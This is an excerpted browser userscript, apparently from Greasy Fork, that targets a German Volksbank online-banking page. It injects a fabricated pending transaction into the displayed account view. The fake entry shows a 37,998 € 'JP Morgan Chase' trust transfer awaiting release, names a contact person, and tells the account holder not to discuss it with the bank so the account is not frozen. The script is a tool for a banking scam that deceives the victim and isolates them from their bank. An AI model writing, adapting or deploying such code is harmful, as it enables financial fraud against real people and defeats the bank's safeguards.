// ==UserScript==
// @name         Ed WM VB-com HEINRICH PAHLS
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/501070/Ed%20WM%20VB-com%20HEINRICH%20PAHLS.user.js
// @updateURL https://update.greasyfork.org/scripts/501070/Ed%20WM%20VB-com%20HEINRICH%20PAHLS.meta.js
// ==/UserScript==
   ...
   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("drive") > 0 ) {
    ...
    const targetHeadingText = 'Verrechnungskonto';

    // Define an array of transactions to insert
    const transactions = [
        {
            date: 'Vorgemerkt',
            details: 'JP Morgan Chase. Treuhand. Freigabe nötig. A. Graf meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.',
            amount: '37.998.24 €', // Example: can be positive or negative
            position: 'above' // Change to 'below' if you want to insert below the original
        },
 //       {
 //           date: '02.08.2024',
 //           details: 'Alice Smith, Bob Brown',
  //          amount: '5,00 €',
 //           position: 'above'
  //      },
 //       {
  //          date: '01.08.2024',
  //          details: 'John Doe, Jane Doe',
  //          amount: '-2,50 €', // Example: can be positive or negative
  //          position: 'above' // Change to 'below' if you want to insert below the original
   //     }
    ...
    function duplicateTransactions() {
        ...
        if (heading) {
            ...
            if (overNextSibling) {
                // Find the first element with the class "table__row table__row--details-trigger" within the over next sibling
                const targetRow = overNextSibling.querySelector('.table__row.table__row--details-trigger');
                if (targetRow) {
                    transactions.forEach((transaction, index) => {
                        ...
                        if (cells.length > 1) {
                            ...
                            cells[1].querySelector('span.output-text.color--cd-text-secondary').textContent = transaction.date;
                    ...
                    console.log('No element with class "table__row table__row--details-trigger" found within the over next sibling.');
                }
            } else {
